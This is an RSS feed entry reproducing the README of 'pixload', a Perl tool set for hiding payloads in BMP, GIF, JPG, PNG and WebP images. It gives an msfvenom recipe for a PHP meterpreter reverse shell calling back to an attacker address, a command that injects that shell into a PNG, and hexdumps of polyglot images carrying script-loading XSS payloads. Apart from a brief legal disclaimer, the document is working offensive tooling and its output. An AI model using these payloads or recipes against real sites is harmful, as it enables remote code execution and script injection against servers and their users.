<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Perl Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-01-02T01:37:42Z</updated>
  <subtitle>Daily Trending of Perl in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>sighook/pixload</title>
    <updated>2023-01-02T01:37:42Z</updated>
    <id>tag:github.com,2023-01-02:/sighook/pixload</id>
    <link href="https://github.com/sighook/pixload" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Image Payload Creating/Injecting tools&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;pixload -- Image Payload Creating tools&lt;/h1&gt; &#xA;&lt;h2&gt;DESCRIPTION&lt;/h2&gt; &#xA;&lt;p&gt;Set of tools for &lt;del&gt;hiding backdoors&lt;/del&gt; creating/injecting payload into images.&lt;/p&gt; &#xA;&lt;p&gt;The following image types are currently supported: BMP, GIF, JPG, PNG, WebP.&lt;/p&gt; &#xA;&lt;h4&gt;about&lt;/h4&gt; &#xA;&lt;p&gt;Useful references for better understanding of &lt;code&gt;pixload&lt;/code&gt; and its use-cases:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs&#34;&gt;Bypassing CSP using polyglot JPEGs&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://web.archive.org/web/20190226193728/https://devcondetect.com/blog/2019/2/24/hacking-group-using-polyglot-images-to-hide-malvertsing-attacks&#34;&gt;Hacking group using Polyglot images to hide malvertising attacks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/&#34;&gt;Encoding Web Shells in PNG IDAT chunks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://whitton.io/articles/xss-on-facebook-via-png-content-types/&#34;&gt;An XSS on Facebook via PNGs &amp;amp; Wonky Content Types&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/&#34;&gt;Revisiting XSS payloads in PNG IDAT chunks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you want to encode a payload in such a way that the resulting binary blob is both valid x86 shellcode and a valid image file, I recommend you to look &lt;a href=&#34;https://web.archive.org/web/20201008001325/https://warroom.securestate.com/bmp-x86-polyglot/&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/raw/master/modules/encoders/x86/bmp_polyglot.rb&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;msfvenom&lt;/h4&gt; &#xA;&lt;p&gt;If you want to inject a metasploit payload, you have to do something like this:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Create metasploit payload (i.e. php).&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ msfvenom -p php/meterpreter_reverse_tcp \&#xA;&#x9;LHOST=192.168.0.1 LPORT=31337 -f raw 2&amp;gt;/dev/null &amp;gt; payload.php&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;Edit &lt;code&gt;payload.php&lt;/code&gt; if needed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Inject &lt;code&gt;payload.php&lt;/code&gt; into the image (i.e. png).&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-png --payload &#34;$(cat payload.php)&#34; payload.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;SETUP&lt;/h2&gt; &#xA;&lt;h5&gt;Dependencies&lt;/h5&gt; &#xA;&lt;p&gt;The following Perl modules are required:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;GD&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Image::ExifTool&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;String::CRC32&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;On &lt;code&gt;Debian-based&lt;/code&gt; systems install these packages:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo apt install libgd-perl libimage-exiftool-perl libstring-crc32-perl&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On &lt;code&gt;FreeBSD&lt;/code&gt; and &lt;code&gt;DragonFlyBSD&lt;/code&gt; install these packages:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;doas pkg install p5-GD p5-Image-ExifTool p5-String-CRC32&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On &lt;code&gt;OSX&lt;/code&gt; please refer to &lt;a href=&#34;https://github.com/chinarulezzz/pixload/issues/3&#34;&gt;this workaround&lt;/a&gt; (thnx 2 @iosdec).&lt;/p&gt; &#xA;&lt;h5&gt;Build and Install&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Docker&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;docker build -t pixload .&#xA;docker run -v &#34;$(pwd):/pixload&#34; -it --rm pixload&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;TOOLS&lt;/h2&gt; &#xA;&lt;h3&gt;pixload-bmp&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-bmp --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-bmp [OPTION]... FILE&#xA;Hide Payload/Malicious Code in BMP Images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -P, --payload STRING   set payload for injection&#xA;  -v, --version          print version and exit&#xA;  -h, --help             print help and exit&#xA;&#xA;If the output FILE already exists, then payload will be injected into this&#xA;existing file. Otherwise, the new one will be created.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-bmp payload.bmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;......... BMP Payload Creator/Injector ........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.bmp&#xA;&#xA;[&amp;gt;] Injecting payload into payload.bmp&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1 x 24, cbSize 10799, bits offset 26&#xA;&#xA;00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|&#xA;00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|&#xA;00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;&amp;lt;script src=/|&#xA;00000030  2f 65 78 61 6d 70 6c 65  2e 63 6f 6d 3e 3c 2f 73  |/example.com&amp;gt;&amp;lt;/s|&#xA;00000040  63 72 69 70 74 3e 3b                              |cript&amp;gt;;|&#xA;00000047&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-bmp.1.pod&#34;&gt;pixload-bmp(1)&lt;/a&gt; manual page for more information.&lt;/p&gt; &#xA;&lt;h3&gt;pixload-gif&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-gif --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-gif [OPTION]... FILE&#xA;Hide payload/malicious code in GIF images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -W, --pixelwidth  INTEGER   (has no effect)&#xA;                              set pixel width for the new image (default: 10799)&#xA;  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)&#xA;  -P, --payload     STRING    set payload for injection&#xA;  -v, --version               print version and exit&#xA;  -h, --help                  print help and exit&#xA;&#xA;The option -W, --pixelwidth has no effect since pixload-gif rewrites&#xA;pixel width bytes with &#34;/*&#34; characters, to prepare the polyglot gif image.&#xA;&#xA;If the output FILE already exists, then the payload will be injected into this&#xA;existing file. Otherwise, the new one will be created with specified pixels&#xA;wide.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-gif payload.gif&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ GIF Payload Creator/Injector .........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.gif&#xA;&#xA;[&amp;gt;] Injecting payload into payload.gif&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.gif: GIF image data, version 87a, 10799 x 32&#xA;&#xA;00000000  47 49 46 38 37 61 2f 2a  20 00 80 00 00 04 02 04  |GIF87a/* .......|&#xA;00000010  00 00 00 2c 00 00 00 00  20 00 20 00 00 02 1e 84  |...,.... . .....|&#xA;00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|&#xA;00000030  e2 48 96 e6 89 a6 ea ca  b6 ee 0b 9b 05 00 3b 2a  |.H............;*|&#xA;00000040  2f 3d 31 3b 3c 73 63 72  69 70 74 20 73 72 63 3d  |/=1;&amp;lt;script src=|&#xA;00000050  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com&amp;gt;&amp;lt;/|&#xA;00000060  73 63 72 69 70 74 3e 3b                           |script&amp;gt;;|&#xA;00000068&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-gif.1.pod&#34;&gt;pixload-gif(1)&lt;/a&gt; manual page for more information.&lt;/p&gt; &#xA;&lt;h3&gt;pixload-jpg&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-jpg --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-jpg [OPTION]... FILE&#xA;Hide Payload/Malicious Code in JPEG images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -S, --section COM|DQT         set section for payload injection&#xA;  -P, --payload STRING          set payload for injection&#xA;  -v, --version                 print version and exit&#xA;  -h, --help                    print help and exit&#xA;&#xA;If the output FILE already exists, then payload will be injected into this&#xA;existing file. Otherwise, the new one will be created.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Examples&lt;/h5&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Inject payload into comment section:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-jpg -S com payload.jpg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ JPEG Payload Creator/Injector ........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.jpg&#xA;&#xA;[&amp;gt;] Injecting payload into COMMENT&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1&#xA;&#xA;00000000  ff d8 ff fe 00 25 3c 73  63 72 69 70 74 20 73 72  |.....%&amp;lt;script sr|&#xA;00000010  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com&amp;gt;|&#xA;00000020  3c 2f 73 63 72 69 70 74  3e ff db 00 43 00 01 01  |&amp;lt;/script&amp;gt;...C...|&#xA;00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|&#xA;*&#xA;00000060  01 01 01 01 01 01 01 01  01 01 01 01 01 01 ff c2  |................|&#xA;00000070  00 0b 08 00 01 00 01 01  01 11 00 ff c4 00 14 00  |................|&#xA;00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|&#xA;0000009e&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Inject payload into DQT table:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-jpg -S dqt payload.jpg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ JPEG Payload Creator/Injector ........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.jpg&#xA;&#xA;[&amp;gt;] Injecting payload into DQT table&#xA;[✔] Payload was injected succesfully&#xA;&#xA;payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1&#xA;&#xA;00000000  ff d8 ff db 00 43 00 01  01 01 01 01 01 01 01 01  |.....C..........|&#xA;00000010  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|&#xA;00000020  01 01 01 01 3c 73 63 72  69 70 74 20 73 72 63 3d  |....&amp;lt;script src=|&#xA;00000030  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com&amp;gt;&amp;lt;/|&#xA;00000040  73 63 72 69 70 74 3e ff  c2 00 0b 08 00 01 00 01  |script&amp;gt;.........|&#xA;00000050  01 01 11 00 ff c4 00 14  00 01 00 00 00 00 00 00  |................|&#xA;00000060  00 00 00 00 00 00 00 00  00 03 ff da 00 08 01 01  |................|&#xA;00000070  00 00 00 01 3f ff d9 01  01 11 00 ff c4 00 14 00  |....?...........|&#xA;00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|&#xA;0000009e&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-jpg.1.pod&#34;&gt;pixload-jpg(1)&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h3&gt;pixload-png&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-png --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-png [OPTION]... FILE&#xA;Hide Payload/Malicious Code in PNG Images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -W, --pixelwidth  INTEGER   set pixel width for the new image (default: 32)&#xA;  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)&#xA;  -P, --payload STRING        set payload for injection&#xA;  -v, --version               print version and exit&#xA;  -h, --help                  print help and exit&#xA;&#xA;If the output FILE already exists, then payload will be injected into this&#xA;existing file. Else, the new one will be created with specified pixels wide.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-png payload.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ PNG Payload Creator/Injector .........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.png&#xA;&#xA;[&amp;gt;] Injecting payload into payload.png&#xA;&#xA;[+] Chunk size: 13&#xA;[+] Chunk type: IHDR&#xA;[+] CRC: fc18eda3&#xA;[+] Chunk size: 9&#xA;[+] Chunk type: pHYs&#xA;[+] CRC: 952b0e1b&#xA;[+] Chunk size: 25&#xA;[+] Chunk type: IDAT&#xA;[+] CRC: c8a288fe&#xA;[+] Chunk size: 0&#xA;[+] Chunk type: IEND&#xA;&#xA;[&amp;gt;] Inject payload to the new chunk: &#39;pUnk&#39;&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced&#xA;&#xA;00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|&#xA;00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|&#xA;00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|&#xA;00000030  c4 01 95 2b 0e 1b 00 00  00 19 49 44 41 54 48 89  |...+......IDATH.|&#xA;00000040  ed c1 31 01 00 00 00 c2  a0 f5 4f ed 61 0d a0 00  |..1.......O.a...|&#xA;00000050  00 00 6e 0c 20 00 01 c8  a2 88 fe 00 00 00 00 49  |..n. ..........I|&#xA;00000060  45 4e 44 ae 42 60 82 00  00 00 00 00 00 00 00 00  |END.B`..........|&#xA;00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;*&#xA;000000c0  00 23 50 55 6e 4b 3c 73  63 72 69 70 74 20 73 72  |.#PUnK&amp;lt;script sr|&#xA;000000d0  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com&amp;gt;|&#xA;000000e0  3c 2f 73 63 72 69 70 74  3e eb fd 2e 9f 00 49 45  |&amp;lt;/script&amp;gt;.....IE|&#xA;000000f0  4e 44                                             |ND|&#xA;000000f2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-png.1.pod&#34;&gt;pixload-png(1)&lt;/a&gt; manual page for more information.&lt;/p&gt; &#xA;&lt;h3&gt;pixload-webp&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-webp --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-webp [OPTION]... FILE&#xA;Hide payloads/malicious code in WebP images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -P, --payload STRING   set payload for injection&#xA;  -v, --version          print version and exit&#xA;  -h, --help             print help and exit&#xA;&#xA;Currently, there is no possibility to inject the payload into an existing&#xA;WebP image. Only the new (minimal) WebP image will be created and your&#xA;payload will be injected into. If the output FILE already exists, the&#xA;payload will be injected into the existing image, but this image will be&#xA;corrupted.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-webp payload.webp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ WebP Payload Creator/Injector ........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.webp&#xA;&#xA;[&amp;gt;] Injecting payload into payload.webp&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.webp: RIFF (little-endian) data, Web/P image&#xA;&#xA;00000000  52 49 46 46 2f 2a 00 00  57 45 42 50 56 50 38 4c  |RIFF/*..WEBPVP8L|&#xA;00000010  ff ff ff 00 2f 00 00 00  10 07 10 11 11 88 88 fe  |..../...........|&#xA;00000020  07 00 2a 2f 3d 31 3b 3c  73 63 72 69 70 74 20 73  |..*/=1;&amp;lt;script s|&#xA;00000030  72 63 3d 2f 2f 65 78 61  6d 70 6c 65 2e 63 6f 6d  |rc=//example.com|&#xA;00000040  3e 3c 2f 73 63 72 69 70  74 3e 3b                 |&amp;gt;&amp;lt;/script&amp;gt;;|&#xA;0000004b&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-webp.1.pod&#34;&gt;pixload-webp(1)&lt;/a&gt; manual page for more information.&lt;/p&gt; &#xA;&lt;h2&gt;LICENSE&lt;/h2&gt; &#xA;&lt;p&gt;WTFPL version 2. See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h2&gt;LEGAL DISCLAIMER&lt;/h2&gt; &#xA;&lt;p&gt;The author does not hold any responsibility for the bad use of this tool, remember that attacking targets without prior consent is illegal and punished by law.&lt;/p&gt; &#xA;&lt;h2&gt;DONATIONS&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;BTC: &lt;code&gt;bc1qj4g98svq6qh3q2ap37v52nsvusa76c3cnmcdmx&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;PAYPAL: &lt;code&gt;alexandr.savca89@gmail.com&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Highly appreciated.&lt;/p&gt; &#xA;&lt;!-- vim:sw=2:ts=2:sts=2:et:cc=80&#xA;End of file. --&gt;</summary>
  </entry>
</feed>